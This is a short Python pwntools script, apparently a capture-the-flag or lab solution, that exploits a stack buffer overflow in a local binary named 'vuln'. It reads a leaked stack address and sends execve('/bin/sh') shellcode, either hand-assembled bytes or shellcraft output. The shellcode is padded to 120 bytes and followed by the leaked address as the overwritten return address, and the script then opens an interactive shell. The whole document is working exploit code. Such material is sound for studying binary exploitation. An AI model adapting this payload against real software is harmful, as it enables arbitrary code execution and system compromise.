#!/usr/bin/python3
from pwn import *

SHELLCODE = b'\x48\x31\xf6\x48\x31\xd2\x56\xb8\x3b\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x0f\x05'  #handwritten shellcode from exec.asm


def get_stack(p):
    p.recvuntil('leak: ')
    data = p.recvline().strip()
    return int(data, 16)

def exploit_hand_written(p):
    stack_leak = get_stack(p)

    p.sendline(SHELLCODE + b'A'*(120-len(SHELLCODE)) + p64(stack_leak))

def exploit_auto(p):
    context.update(arch='amd64', os='linux')
    stack_leak = get_stack(p)

    auto_shell = asm(shellcraft.sh())

    p.sendline(auto_shell + b'A'*(120 - len(auto_shell)) + p64(stack_leak))

p = process('./vuln')

#p = gdb.debug('./vuln', '''
#b main
#c
#''')
#exploit_hand_written(p)
exploit_auto(p)

p.interactive()